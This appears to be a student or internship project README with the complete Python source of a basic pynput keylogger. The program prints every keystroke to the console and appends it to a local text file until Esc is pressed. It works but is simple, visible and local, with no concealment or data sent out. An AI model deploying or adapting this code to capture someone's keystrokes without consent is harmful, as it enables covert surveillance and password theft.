# PRODIGY_CS_04
This project involves the development of a basic keylogger program using Python. The keylogger records and logs keystrokes, saving them to a file for analysis. Utilizing the pynput library, the program captures both alphanumeric and special key inputs, storing them in a text file. 

from pynput import keyboard

# Function to handle key press events
def on_press(key):
    try:
        # Print the pressed key (for debugging/monitoring purposes)
        print(f'Alphanumeric key pressed: {key.char}')
        # Open the log file in append mode
        with open("keylog.txt", 'a') as log_file:
            # Write the character to the log file
            log_file.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        print(f'Special key pressed: {key}')
        with open("keylog.txt", 'a') as log_file:
            # Write the special key to the log file
            log_file.write(f'[{key}]')

# Function to handle key release events
def on_release(key):
    # Stop listener if the 'Esc' key is released
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    # Setup the listener for key press and release events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # Start the listener and keep it running
        listener.join()
